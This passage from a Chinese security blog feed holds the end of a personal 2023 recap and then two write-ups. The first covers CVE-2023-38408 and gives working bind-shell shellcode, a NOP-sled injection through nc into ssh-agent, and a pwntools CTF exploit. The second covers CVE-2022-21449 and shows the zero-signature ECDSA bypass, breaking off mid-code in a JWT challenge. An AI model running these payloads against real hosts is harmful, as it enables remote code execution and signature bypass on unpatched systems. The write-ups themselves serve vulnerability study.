</span><br></pre></td></tr></table></figure><p>走的地方：</p><ul><li>成都：大本营，基本就是学校（学校里寝室-教室-实验室三点一线），经常和群友到北街恰饭，开发了不少好地方。平安SRC讲座+晚宴，讲座都是二进制的东西，挖浏览器的洞太帅了（），其他看不懂（），晚宴丰盛捏。加了长亭的大佬v，问有无内推，答最近没hc。安全行业愁云惨淡。</li><li>北京：去耍的，逛航博。想把阿鲁约出来吃饭，犬安大哥不待见兄弟😭。路上误打误撞闯入奇安信老窝，正值护网阶段，门口四个佬聊技术，给🐭🐭听的一愣一愣的。</li><li>深圳：补天白帽大会。讲座请了y4讲字节码，另外还有山大女博士讲安卓提权，忘了谁讲的开发交互式的二进制漏洞挖掘工具。我带着迷茫去深圳，带着思考、收获、信心回来。</li><li>哈尔滨：哈工大真大，计算机学院有独立的楼，把🐭🐭震惊到了。市区俄味很浓。</li><li>沈阳：到沈阳大街，做大保健。</li><li>丹东：隔着鸭绿江，眺望光之国。</li><li>重庆：父母游母校拉上🐭🐭的。</li></ul><p>我时常回忆起22年打鹏程杯的那个夏天，那时我们打车去赛场，阳光正好，我们满怀对未来的憧憬。如今人走人留，有失有得，让我每每回想无语凝噎。而<strong>2023年</strong>，就像一个长长的假期，上半年紧张的放假，下半年悠闲的放假。我走了很多地方，但真正留在我心底的美景就那么几个；认识了很多人，也因为自身或外部原因与他们断了联系；参与了很多事情，有些搞的好，不过好多还是没搞好。在迷茫中挣扎求变，上下求索就是我2023的最好画像。</p><p>就这样吧，希望<strong>2024</strong>变得更好。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401010131505.png" alt="image-20240101013133418"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。&lt;/p&gt;
&lt;p&gt;送别大四两位毕业的学长师傅。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;长亭外，古道边，芳草碧连天&lt;br</summary>
      
    
    
    
    
    <category term="other" scheme="http://example.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-38408-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/</id>
    <published>2023-12-27T15:56:20.000Z</published>
    <updated>2024-01-27T01:27:57.410Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008" alt="img"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SSH（Secure Shell）是一种加密的网络传输协议。主要用来在客户端和服务器之间建立安全通信隧道。使用SSH进行远程登录，信息传输是加密的，即使信息被中途截获也不会泄露。OpenSSH软件套件负责SSH协议的实现。</p><p>23年七月爆出来OpenSSH(9.3p2版本以前)的一个CVE，用户使用 SSH-Agent 代理转发功能连接攻击者恶意服务器时，由于 SSH-Agent 未对加载的共享库进行限制，攻击者可通过将恶意共享库作为参数传递给 SSH-Agent 并通过其调用 dlopen&#x2F;dlclose 函数加载 &#x2F; 卸载位于用户客户端主机的共享库，实现远程代码执行。</p><p>攻击流程如图：</p><p><img src="https://github.com/LucasPDiniz/CVE-2023-38408/raw/main/img/poc.JPG" alt="img"></p><ul><li>攻击者通过SSH连接到服务器</li><li>Alice也通过SSH连接到服务器，此时Alice使用SSH转发代理连接到攻击者。</li><li>攻击者创建shellcode, 通过ssh进程发送给目标服务器</li><li>shellcode利用ssh-agent的PKCS#11漏洞创建一个新进程，劫持Alice的ssh访问权限</li><li>成功执行该攻击后，攻击者可能会访问绑定shell（shell代码），该shell可以使用netcat进行访问。</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>目标：提升redqueenrebel权限，损害alice账户</p><p>机器：</p><ul><li>workstation: 受害者机器</li><li>kali 攻击者机器</li></ul><p>用户：</p><ul><li>redqueenrebel: 非特权用户</li><li>alice: workstation的root用户</li><li>root: hacker</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先我们已经完成攻击的第一、二步，也即两个用户已经有权通过SSH访问服务器。</p><ol><li><p>获取在远程攻击者计算机上运行的 SSH 代理的 PID ，并导出到环境变量。我们还通过 ssh-add 添加了文件 linuxx64.elf.stub（UEFI 引导存根）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/ssh-*/agent.*</span><br><span class="line"><span class="built_in">export</span> SSH_AUTH_SOCK=/tmp/ssh-NqLP6il36s/agent.3452</span><br><span class="line">ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042335331.png" alt="image-20240104233548210"></p><ol start="2"><li><p>通过SSH把 shellcode复制到进程中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE=$<span class="string">&#x27;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05&#x27;</span></span><br><span class="line">(perl -e <span class="string">&#x27;print &quot;\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6&quot; . &quot;\x90&quot; x 10000&#x27;</span>; <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$SHELLCODE</span>&quot;</span>) | nc -U <span class="string">&quot;<span class="variable">$SSH_AUTH_SOCK</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>一旦 shellcode 成功放入代理内存中，直接按CtrlC，停止 netcat 传输。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042337741.png" alt="image-20240104233746664"></p><ol start="3"><li><p>通过ssh-add上传：ibttcn3-rt2-dynamic.so、libKF5SonnetUi.so.5.92.0 和 libns3.35-wave.so.0.0.0，触发<strong>SIGSEGV</strong>漏洞。</p><blockquote><p><code>SIGSEGV</code> 是Linux和类Unix系统中的一个信号，它表示”Segmentation Fault”（分段错误）。当一个程序尝试访问未分配给它的内存区域，或者访问已经被释放的内存区域，就会触发 <code>SIGSEGV</code> 信号。收到 SIGSEGV 信号后，内核会识别出发生了无效内存访问，并继续调用自定义信号处理程序，而不是突然终止程序。此时攻击者会操纵程序的执行，并将其引导至位于 NOP 雪橇内的注入恶意代码。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>成功提Alice的权，映射到端口31337上。</p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042352811.png" alt="image-20240104235222726" style="zoom: 50%;" /></li></ol><h2 id="PS1-nop-sled"><a href="#PS1-nop-sled" class="headerlink" title="PS1 nop-sled"></a>PS1 nop-sled</h2><p>nop是一条不做任何操作的单指令，对应的十六进制编码为0x90。这里nop将被用作欺骗因子。通过创建一个大的NOP指令数组并将其放在shellcode之前，如果EIP返回到存储nop sled的任意地址，那么在达到shellcode之前，每执行一条nop指令，EIP都会递增。这就是说只要返回地址被nop sled中的某一地址所重写，EIP就会将sled滑向将正常执行的shellcode。<br>以一个简单程序的pwn解释：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052031291.png" alt="image-20240105203131190"></p><p>32位，canary保护开了，但没开NX和PIE，所以还是可以把shellcode写到栈上执行的。</p><p>反汇编main函数时报错：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052122346.png" alt="image-20240105212226312"></p><p>由于F5在分析调用时，未能成功解析参数位置&#x2F;参数个数，<br>解决方法：就是先undefine掉函数，在右键现在code,之后Creat function 就可以正常反编译了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [esp+4h] [ebp-100Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+1004h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// [esp+1008h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1010h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)&amp;seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  v3 = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> sub_8048A22(v5, (<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_position函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行逻辑是：</p><ul><li>输出栈中的地址</li><li>输入字符串赋给seed</li><li>输入地址赋给v5</li><li>使用v5()，从输入的地址，执行该地址的代码</li></ul><p>如果在栈中的某个位置填入大量nop指令再接上shellcode，随后控制程序的执行流从nop指令开始执行，则程序就会一直执行之前填入的nop，然后就是shellcode，从而成功pwn掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>,<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;current location: &quot;</span>)</span><br><span class="line"><span class="comment"># 接收position</span></span><br><span class="line">addr = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"><span class="comment"># \x90为nop指令</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 输进v5的地址</span></span><br><span class="line">shell_addr = addr + <span class="number">0x2d</span> + <span class="number">668</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(shell_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052351754.png" alt="image-20240105235100666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;&lt;img src=&quot;https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008&quot; alt=&quot;img&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-21449-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/</id>
    <published>2023-12-27T07:36:51.000Z</published>
    <updated>2023-12-27T07:39:44.514Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ECDSA代表椭圆曲线数字签名算法，与旧的RSA签名相比，ECDSA签名长度更短，因此应用面较广，例如各种JWT场景。服务器使用java15~18版本的ECDSA，会受到攻击者绕过的影响。由于ECDSA未对提交的r和s值做仔细的检查，攻击者可通过将为0的r和s作为参数提交给服务器，实现绕过验签的过程。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>JShell – 版本 15.0.2</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jshell&gt; <span class="keyword">import</span> java.security.*</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">keys</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>).generateKeyPair()</span><br><span class="line">keys ==&gt; java.security.KeyPair@63e31ee</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">blankSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>]</span><br><span class="line">blankSignature ==&gt; <span class="type">byte</span>[<span class="number">64</span>] &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, ... , <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">sig</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256WithECDSAInP1363Format&quot;</span>)</span><br><span class="line">sig ==&gt; Signature object: SHA256WithECDSAInP1363Format&lt;not initialized&gt;</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.initVerify(keys.getPublic())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.update(<span class="string">&quot;Hello, World&quot;</span>.getBytes())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.verify(blankSignature)</span><br><span class="line">$<span class="number">7</span> ==&gt; <span class="literal">true</span></span><br><span class="line"><span class="comment">// 成功绕过验签</span></span><br></pre></td></tr></table></figure><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>ECDSA签名由两个值组成，称为r和s。验签需要检查的含有r, s, 公钥和消息的摘要值的方程。方程一侧是r, 另一侧包含r和s。因此如果r和s均为0，则方程结果是$0&#x3D;0\times \alpha(something)$, 从而方程成立，验签通过。</p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>jwt一般会对参数编码，故针对特定场景，需要构造不同的payload。</p><p>强网杯2022 <strong>myJWT</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> KeyPair <span class="title function_">keyGen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">384</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="keyword">return</span> keyPair;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] sign(<span class="type">byte</span>[] str, ECPrivateKey privateKey) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initSign(privateKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="type">byte</span>[] sig = signature.sign();</span><br><span class="line">        <span class="keyword">return</span> sig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(<span class="type">byte</span>[] sig, <span class="type">byte</span>[] str ,ECPublicKey publicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initVerify(publicKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="keyword">return</span> signature.verify(sig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jwt</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">EXPIRE</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">ECDSA</span> <span class="variable">ecdsa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ECDSA</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(String user, ECPrivateKey ecPrivateKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">header</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        header.put(<span class="string">&quot;alg&quot;</span>, <span class="string">&quot;myES&quot;</span>);</span><br><span class="line">        header.put(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(header.toJSONString().getBytes());</span><br><span class="line">        payload.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;qwb&quot;</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;exp&quot;</span>, System.currentTimeMillis() + EXPIRE * <span class="number">1000</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;name&quot;</span>, user);</span><br><span class="line">        payload.put(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(payload.toJSONString().getBytes());</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">        <span class="type">byte</span>[] sig = ecdsa.sign(content.getBytes(), ecPrivateKey);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(sig);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, content, sigB64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String token, ECPublicKey ecPublicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] parts = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (parts.length != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> parts[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> parts[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> parts[<span class="number">2</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">            <span class="type">byte</span>[] sig = Base64.getUrlDecoder().decode(sigB64);</span><br><span class="line">            <span class="keyword">return</span> ecdsa.verify(sig, content.getBytes(), ecPublicKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkAdmin</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span>(verify(token, ecPublicKey)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> token.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadDecodeString</span> <span 